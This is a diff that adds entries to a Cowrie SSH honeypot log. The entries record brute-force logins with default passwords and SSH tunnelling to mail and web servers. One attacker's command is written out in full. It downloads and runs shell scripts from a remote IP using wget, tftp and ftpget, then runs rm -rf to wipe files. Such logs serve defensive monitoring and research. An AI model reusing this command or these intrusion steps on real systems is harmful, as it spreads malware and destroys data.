@@ -4264,3 +4264,149 @@
 2017-04-27T20:49:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] got channel 'direct-tcpip' request
 2017-04-27T20:49:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] direct-tcp connection request to 68.169.58.57:25 from localhost:5556
 2017-04-27T20:50:01+0000 [SSHChannel None (177) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote eof
+2017-04-27T20:50:02+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 107.174.34.71:43088 (10.8.41.81:2222) [session: c571c359]
+2017-04-27T20:50:03+0000 [HoneyPotSSHTransport,43907,107.174.34.71] Remote SSH version: SSH-2.0-libssh2_1.4.2
+2017-04-27T20:50:03+0000 [HoneyPotSSHTransport,43907,107.174.34.71] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-04-27T20:50:03+0000 [HoneyPotSSHTransport,43907,107.174.34.71] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-27T20:50:03+0000 [HoneyPotSSHTransport,43907,107.174.34.71] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-27T20:50:03+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 5.9.106.3:56374 (10.8.41.81:2222) [session: a5f4174b]
+2017-04-27T20:50:03+0000 [HoneyPotSSHTransport,43908,5.9.106.3] Remote SSH version: SSH-2.0-PuTTY_Release_0.63
+2017-04-27T20:50:03+0000 [HoneyPotSSHTransport,43908,5.9.106.3] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-04-27T20:50:03+0000 [HoneyPotSSHTransport,43908,5.9.106.3] outgoing: 'aes256-ctr' 'hmac-sha1' 'none'
+2017-04-27T20:50:03+0000 [HoneyPotSSHTransport,43908,5.9.106.3] incoming: 'aes256-ctr' 'hmac-sha1' 'none'
+2017-04-27T20:50:04+0000 [HoneyPotSSHTransport,43907,107.174.34.71] NEW KEYS
+2017-04-27T20:50:04+0000 [HoneyPotSSHTransport,43907,107.174.34.71] starting service 'ssh-userauth'
+2017-04-27T20:50:04+0000 [SSHChannel None (177) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote close
+2017-04-27T20:50:04+0000 [SSHChannel None (177) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] sending close 177
+2017-04-27T20:50:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43907,107.174.34.71] '1111' trying auth 'password'
+2017-04-27T20:50:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43907,107.174.34.71] login attempt: 11
+2017-04-27T20:50:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43907,107.174.34.71] login return, expect: [1111/1111]
+2017-04-27T20:50:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43907,107.174.34.71] login attempt [1111/1111] succeeded
+2017-04-27T20:50:06+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43907,107.174.34.71] '1111' authenticated with 'password'
+2017-04-27T20:50:06+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43907,107.174.34.71] starting service 'ssh-connection'
+2017-04-27T20:50:06+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] got channel 'session' request
+2017-04-27T20:50:06+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] channel open
+2017-04-27T20:50:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.68/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.68 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.68; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.68 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-04-27T20:50:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] Opening TTY Log: log/tty/20170427-205007-c571c359-0e.log
+2017-04-27T20:50:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.68/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.68 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.68; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.68 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-04-27T20:50:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] Command found: cd /tmp
+2017-04-27T20:50:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] Command found: cd /var/run
+2017-04-27T20:50:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] Command found: cd /mnt
+2017-04-27T20:50:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] Command found: cd /root
+2017-04-27T20:50:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] Command found: cd /
+2017-04-27T20:50:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] Command found: wget http://107.174.34.68/Swag.sh
+2017-04-27T20:50:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.174.34.68/Swag.sh>
+2017-04-27T20:50:07+0000 [SSHChannel None (178) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote eof
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Not storing duplicate content 597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Downloaded URL (http://107.174.34.68/Swag.sh) with SHA-256 597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9 to dl/597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 /Swag.sh
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Command found: sh /Swag.sh
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Command found: tftp 107.174.34.68 -c get tftp1.sh
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 107.174.34.68
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-04-27T20:50:07+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 107.174.34.68 ftp1.sh ftp1.sh
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] FTP connect failed: host=107.174.34.68, port=21, err=[Errno 111] Connection refused
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] Command found: rm -rf /Swag.sh tftp1.sh tftp2.sh ftp1.sh
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] Not storing duplicate content 597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9 to dl/597e812e875da845cd2cbfd30f6709b3105fe18c77aceadc6e2460dadde222f9
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170427-205007-c571c359-0e.log after 1 seconds
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-04-27T20:50:08+0000 [HTTPPageDownloader,client] sending close 0
+2017-04-27T20:50:08+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://107.174.34.68/Swag.sh>
+2017-04-27T20:50:08+0000 [SSHChannel None (178) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote close
+2017-04-27T20:50:08+0000 [SSHChannel None (178) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] sending close 178
+2017-04-27T20:50:13+0000 [HoneyPotSSHTransport,43908,5.9.106.3] NEW KEYS
+2017-04-27T20:50:13+0000 [HoneyPotSSHTransport,43908,5.9.106.3] starting service 'ssh-userauth'
+2017-04-27T20:50:13+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43908,5.9.106.3] 'user' trying auth 'none'
+2017-04-27T20:50:15+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43908,5.9.106.3] 'user' authenticated with 'none'
+2017-04-27T20:50:15+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43908,5.9.106.3] starting service 'ssh-connection'
+2017-04-27T20:50:16+0000 [SSHChannel None (179) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote eof
+2017-04-27T20:50:17+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43907,107.174.34.71] remote close
+2017-04-27T20:50:17+0000 [HoneyPotSSHTransport,43907,107.174.34.71] avatar 1111 logging out
+2017-04-27T20:50:17+0000 [HoneyPotSSHTransport,43907,107.174.34.71] connection lost
+2017-04-27T20:50:17+0000 [HoneyPotSSHTransport,43907,107.174.34.71] Connection lost after 14 seconds
+2017-04-27T20:50:19+0000 [SSHChannel None (179) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote close
+2017-04-27T20:50:19+0000 [SSHChannel None (179) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] sending close 179
+2017-04-27T20:50:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] got channel 'direct-tcpip' request
+2017-04-27T20:50:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] direct-tcp connection request to 144.160.159.22:25 from localhost:5556
+2017-04-27T20:50:23+0000 [SSHChannel None (180) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote eof
+2017-04-27T20:50:23+0000 [SSHChannel None (180) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote close
+2017-04-27T20:50:23+0000 [SSHChannel None (180) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] sending close 180
+2017-04-27T20:50:26+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] got channel 'direct-tcpip' request
+2017-04-27T20:50:26+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] direct-tcp connection request to 144.160.159.21:25 from localhost:5556
+2017-04-27T20:50:29+0000 [SSHChannel None (181) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote eof
+2017-04-27T20:50:30+0000 [SSHChannel None (181) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote close
+2017-04-27T20:50:30+0000 [SSHChannel None (181) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] sending close 181
+2017-04-27T20:50:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43908,5.9.106.3] got channel 'direct-tcpip' request
+2017-04-27T20:50:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43908,5.9.106.3] direct-tcp connection request to 104.28.9.180:80 from 0.0.0.0:0
+2017-04-27T20:50:36+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43908,5.9.106.3] direct-tcp forward to 104.28.9.180:80 with data 'GET / HTTP/1.1\r\nHost: youradultube.com\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0 AlexaToolbar/alxf-2.21\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nReferer: http://www.google.com/url?sa=t&rct=j&q=amateur+skinny+latina+hottie+toying+dp&esrc=s&source=web&cd=200&cad=rja&ved=0CCAQFjAA&url=http%3A%2F%2Fwww.itunemusic.online%2F&ei=HlyPUMO3FMSPrge8y4DwAQ&usg=AFQjCNF\r\nAccept-Encoding: gzip,deflate\r\nAccept-Language: en-gb;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n'
+2017-04-27T20:50:36+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43908,5.9.106.3] failed to connect: Connection refused
+2017-04-27T20:50:36+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43908,5.9.106.3] sending close 0
+2017-04-27T20:50:36+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43908,5.9.106.3] remote eof
+2017-04-27T20:50:36+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43908,5.9.106.3] remote close
+2017-04-27T20:50:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] got channel 'direct-tcpip' request
+2017-04-27T20:50:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] direct-tcp connection request to 144.160.159.21:25 from localhost:5556
+2017-04-27T20:50:36+0000 [HoneyPotSSHTransport,43908,5.9.106.3] avatar user logging out
+2017-04-27T20:50:36+0000 [HoneyPotSSHTransport,43908,5.9.106.3] connection lost
+2017-04-27T20:50:36+0000 [HoneyPotSSHTransport,43908,5.9.106.3] Connection lost after 33 seconds
+2017-04-27T20:50:37+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] got channel 'direct-tcpip' request
+2017-04-27T20:50:37+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-04-27T20:50:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] got channel 'direct-tcpip' request
+2017-04-27T20:50:39+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-04-27T20:50:41+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] got channel 'direct-tcpip' request
+2017-04-27T20:50:41+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-04-27T20:50:48+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 189.7.225.20:53666 (10.8.41.81:2222) [session: 40605eeb]
+2017-04-27T20:50:49+0000 [HoneyPotSSHTransport,43909,189.7.225.20] Remote SSH version: SSH-2.0-libssh2_1.7.0
+2017-04-27T20:50:49+0000 [HoneyPotSSHTransport,43909,189.7.225.20] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-04-27T20:50:49+0000 [HoneyPotSSHTransport,43909,189.7.225.20] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-27T20:50:49+0000 [HoneyPotSSHTransport,43909,189.7.225.20] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-27T20:50:49+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] got channel 'direct-tcpip' request
+2017-04-27T20:50:49+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] direct-tcp connection request to 144.160.159.22:25 from localhost:5556
+2017-04-27T20:50:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43870,91.230.47.75] got channel 'direct-tcpip' request
+2017-04-27T20:50:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43870,91.230.47.75] direct-tcp connection request to 52.223.196.214:80 from localhost:5556
+2017-04-27T20:50:51+0000 [SSHChannel None (87) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43870,91.230.47.75] direct-tcp forward to 52.223.196.214:80 with data 'GET /v0/CtABejM9Bxab_je9-J_h_CL8PzbF3eM2CLkGxgnAaCTxA5XWUshdj0LYiKTYyOMCEDre5ieCKQVH-fT0TG1qp9in5ykywnr9-ug-sCLnK7iaZ6l-RBIf9WCDkoFG8Xq5hm7TeJ9KFHSQ67aPl1Z6S9od_lNT2cPdcSf8lcbrZsIlRjaV56ZwZ911Gm8I3D0D-ofk68n3eEYY_kw4qDTOTS5JhzcFho0lZ_g9qQS7ymd8Lz_Xu1fvS1X3vLZAZ5BLQwKxt4UgoYQcDtdbPB-_dVIMlxIQIQvC2kBfOy6ceA7_neZBuRoMABljvidzlVJTa93-/index-live.m3u8 HTTP/1.1\r\nHost: video-edge-c55de4.fra02.hls.ttvnw.net\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n'
+2017-04-27T20:50:51+0000 [SSHChannel None (87) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43870,91.230.47.75] failed to connect: Connection refused
+2017-04-27T20:50:51+0000 [SSHChannel None (87) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43870,91.230.47.75] sending close 87
+2017-04-27T20:50:52+0000 [HoneyPotSSHTransport,43909,189.7.225.20] NEW KEYS
+2017-04-27T20:50:52+0000 [HoneyPotSSHTransport,43909,189.7.225.20] starting service 'ssh-userauth'
+2017-04-27T20:50:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] 'nginx' trying auth 'password'
+2017-04-27T20:50:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] login attempt: 5
+2017-04-27T20:50:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] login return, expect: [last/last]
+2017-04-27T20:50:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] login attempt [nginx/nginx] failed
+2017-04-27T20:50:53+0000 [SSHChannel None (182) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote eof
+2017-04-27T20:50:54+0000 [-] 'nginx' failed auth 'password'
+2017-04-27T20:50:54+0000 [-] unauthorized login: 
+2017-04-27T20:50:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] 'nginx' trying auth 'password'
+2017-04-27T20:50:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] login attempt: 6
+2017-04-27T20:50:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] login return, expect: [last/last]
+2017-04-27T20:50:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] login attempt [nginx/nginx] failed
+2017-04-27T20:50:56+0000 [-] 'nginx' failed auth 'password'
+2017-04-27T20:50:56+0000 [-] unauthorized login: 
+2017-04-27T20:50:56+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43867,91.195.103.202] got channel 'direct-tcpip' request
+2017-04-27T20:50:56+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43867,91.195.103.202] direct-tcp connection request to 143.248.5.130:465 from localhost:5556
+2017-04-27T20:50:56+0000 [SSHChannel None (182) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] remote close
+2017-04-27T20:50:56+0000 [SSHChannel None (182) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43904,91.230.47.82] sending close 182
+2017-04-27T20:50:56+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43870,91.230.47.75] got channel 'direct-tcpip' request
+2017-04-27T20:50:56+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43870,91.230.47.75] direct-tcp connection request to 52.223.196.157:80 from localhost:5556
+2017-04-27T20:50:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] 'nginx' trying auth 'password'
+2017-04-27T20:50:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] login attempt: 7
+2017-04-27T20:50:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] login return, expect: [last/last]
+2017-04-27T20:50:56+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,43909,189.7.225.20] login attempt [nginx/nginx] failed
+2017-04-27T20:50:56+0000 [SSHChannel None (9) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43867,91.195.103.202] direct-tcp forward to 143.248.5.130:465 with data "\x16\x03\x01\x01.\x01\x00\x01*\x03\x03\x8e{\xf5\x7fP\xe5\x17\xd5\x0fr\x97\x8eQ\x8c\x80\xae\xcdBg\x8d}\xe0\x03\x8df\xef%\xce.\xf8\xe7\x8a\x00\x00\xac\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0\n\x00\xa5\x00\xa3\x00\xa1\x00\x9f\x00k\x00j\x00i\x00h\x009\x008\x007\x006\x00\x88\x00\x87\x00\x86\x00\x85\xc02\xc0.\xc0*\xc0&\xc0\x0f\xc0\x05\x00\x9d\x00=\x005\x00\x84\xc0/\xc0+\xc0'\xc0#\xc0\x13\xc0\t\x00\xa4\x00\xa2\x00\xa0\x00\x9e\x00g\x00@\x00?\x00>\x003\x002\x001\x000\x00\x9a\x00\x99\x00\x98\x00\x97\x00E\x00D\x00C\x00B\xc01\xc0-\xc0)\xc0%\xc0\x0e\xc0\x04\x00\x9c\x00<\x00/\x00\x96\x00A\x00\x07\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\xc0\x12\xc0\x08\x00\x16\x00\x13\x00\x10\x00\r\xc0\r\xc0\x03\x00\n\x00\xff\x01\x00\x00U\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x1c\x00\x1a\x00\x17\x00\x19\x00\x1c\x00\x1b\x00\x18\x00\x1a\x00\x16\x00\x0e\x00\r\x00\x0b\x00\x0c\x00\t\x00\n\x00#\x00\x00\x00\r\x00 \x00\x1e\x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x00\x0f\x00\x01\x01"
+2017-04-27T20:50:56+0000 [SSHChannel None (9) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43867,91.195.103.202] failed to connect: Connection refused
+2017-04-27T20:50:56+0000 [SSHChannel None (9) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43867,91.195.103.202] sending close 9
+2017-04-27T20:50:56+0000 [SSHChannel None (88) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43870,91.230.47.75] direct-tcp forward to 52.223.196.157:80 with data 'GET /v0/CtkB0p8TEq8OCDgGDfLtPD0FdHy6ymcgoi3AEOcoK_z8vaf3UjIRKGb9Zg03GJQzXXJcssCgP7mhWn8GbNbFAIPD_eMhOfRpra9Q1ZCp0BE3FzqmbNMEs1t_QMb1s9Os_ZDzrHULiHVxKNQ9YuSCZAzhwx6bmNFRYYnQy7KWHoOFbczMGvXcZhr_f_90Cu_-N240bQ42Cvv4E60yNRD_gfymUztZdGXhpHIvUsUQ3I7wYG7DfVL1r3nQ-s8r1swIQVmK8HoIG9cBnEOSwZFK3StH37myu2KeLTVhMBIQKTAES6Gl__eaxl3jDohlqhoMJsHYtMge7SzVSau2/index-live.m3u8 HTTP/1.1\r\nHost: video-edge-c2b288.fra02.hls.ttvnw.net\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n'
+2017-04-27T20:50:56+0000 [SSHChannel None (88) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43870,91.230.47.75] failed to connect: Connection refused
+2017-04-27T20:50:56+0000 [SSHChannel None (88) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43870,91.230.47.75] sending close 88
+2017-04-27T20:50:57+0000 [-] 'nginx' failed auth 'password'
+2017-04-27T20:50:57+0000 [-] unauthorized login: 
+2017-04-27T20:50:58+0000 [HoneyPotSSHTransport,43909,189.7.225.20] connection lost
+2017-04-27T20:50:58+0000 [HoneyPotSSHTransport,43909,189.7.225.20] Connection lost after 9 seconds
